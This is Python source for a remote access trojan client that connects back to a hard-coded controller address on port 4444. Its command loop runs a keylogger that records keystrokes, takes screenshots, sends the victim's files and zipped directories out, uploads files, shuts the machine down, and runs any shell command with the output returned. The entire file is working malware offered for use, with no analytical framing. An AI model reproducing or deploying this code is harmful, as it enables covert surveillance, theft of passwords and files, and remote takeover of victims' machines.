import socket
import json
import subprocess
import os
import base64 
import time
from pynput.keyboard import Listener
import threading
import sys
import shutil
import tempfile
import mss
from colorama import Fore, init

def server(ip, port):
    global connection 
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            connection.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(5)

def send(data):
    json_data = json.dumps(data)
    connection.send(json_data.encode('utf-8'))

def recieve():
    json_data = '' 
    while True:
        try:
            json_data += connection.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

key_information = 'logs.txt'

def start_keylogger():
    global listener
    listener = Listener(on_press=write_to_file)
    listener.start()
    listener.join()

def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
        return (f"{Fore.GREEN}[+] Keylogger stopped{Fore.RESET}")
    else:
        return (f"{Fore.GREEN}[-] Keylogger is not runnning!{Fore.RESET}")

def write_to_file(key):
    log = str(key)
    log = log.replace("'", '')

    if log == 'Key.space':
        log = ' '
    if log == 'Key.enter':
        log = '\n'
    if log == 'Key.tab':
        log = ''
    if log == 'Key.shift':
        log = ''
    if log == 'Key.backspace':
        log = ' [BACKSPACE] '

    with open(key_information, 'a') as f:
        f.write(log)

def take_screenshot():
    tmp_file = tempfile.mktemp(suffix=".png")
    with mss.mss() as sct:
        sct.shot(output=tmp_file)
    with open(tmp_file, "rb") as f:
        encoded = base64.b64encode(f.read()).decode('utf-8')
    os.remove(tmp_file)
    return encoded

def run():
    while True:
        command = recieve()
        if command == 'exit':
            break
        
        elif command[:2] == 'ls':
            send(os.listdir('.'))

        elif command[:2] == 'cd' and len(command) > 1:
            try:
                os.chdir(command[3:])
                send(f"{Fore.GREEN}Directory changed in {command[3:]}{Fore.RESET}")
            except FileNotFoundError:
                send(f"{Fore.RED}[-] Direcotry doesn't exists{Fore.RESET}")
                pass

        elif command [:8] == 'download':
            path = command[9:]
            if os.path.isdir(path):
                tmp_zip = tempfile.mktemp(suffix=".zip")
                shutil.make_archive(tmp_zip.replace(".zip", ""), 'zip', path)
                with open(tmp_zip, "rb") as f:
                    send(base64.b64encode(f.read()).decode('utf-8'))
                os.remove(tmp_zip)
            else:
                try:
                    with open(path, 'rb') as f:
                        send(base64.b64encode(f.read()).decode('utf-8'))
                except FileNotFoundError:
                    send('File not found')

        elif command[:6] == 'upload':
            with open(command[7:], 'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        
        elif command == 'keylogger_start':
            t = threading.Thread(target=start_keylogger, daemon=True)
            t.start()
            send(f"{Fore.GREEN}[+] Keylogger running in background . . .{Fore.RESET}")
        
        elif command == 'keylogger_stop':
            result = stop_keylogger()
            send(result)
        
        elif command == 'turn_off':
            if sys.platform == 'win32':

                import ctypes
                user32 = ctypes.WinDLL('user32')
                user32.ExitWindowsEx(0x00000008, 0x00000000)
                
            else:
                os.system('sudo shutdown now')
        
        elif command == 'screenshot':
            img_data = take_screenshot()
            send(img_data)

        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            result = process.stdout.read() + process.stderr.read()
            send(result)
            continue

server('192.168.1.187', 4444)
run()
